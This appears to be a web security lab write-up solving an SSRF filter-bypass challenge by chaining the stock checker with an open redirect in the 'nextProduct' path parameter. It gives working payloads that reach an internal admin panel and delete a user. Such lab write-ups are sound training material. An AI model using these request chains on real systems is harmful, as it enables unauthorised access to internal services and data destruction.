## Lab description:

<img width="1379" height="775" alt="Screenshot 2025-11-12 132359" src="https://github.com/user-attachments/assets/78073662-9bc8-4004-835b-28f07507a4cb" />

## Solution:

This lab has a check stock feature with fetches data from internal server

We can use a check stock:

<img width="1896" height="903" alt="Screenshot 2025-11-12 132545" src="https://github.com/user-attachments/assets/65b7ff9e-7d83-46f5-98c7-43ff12e94c2e" />

The server will response:

<img width="1343" height="626" alt="Screenshot 2025-11-12 132601" src="https://github.com/user-attachments/assets/cf40385b-728e-436a-9926-4a6ace977def" />

The stockApi parameter has a value: 
```
stockApi=/product/stock/check?productId=1&storeId=1
```

We know that the stock checker has been restricted to only access the local application, so we can't use the older payload like :
```
stockApi=http://localhost/admin
```

So, we try to open redirect affecting the application:

Now, we need to pay attention that the application has a next product button:

<img width="1905" height="458" alt="Screenshot 2025-11-12 134005" src="https://github.com/user-attachments/assets/00f27126-4d0f-4856-9796-69b6ef86a677" />

When we click next product, the back-end will response:

<img width="1482" height="502" alt="Screenshot 2025-11-12 134045" src="https://github.com/user-attachments/assets/c195fb8e-084c-43d3-98a7-dc243ee56f12" />

The GET request has a ```&path``` parameter, we can use this to open redirect to local application

```
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```
<img width="1476" height="696" alt="Screenshot 2025-11-12 134208" src="https://github.com/user-attachments/assets/4a728f81-0b9d-469f-a626-f5c6d841776a" />

The server respone <Found> so we can use this to delete user carlos:

```
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos
```

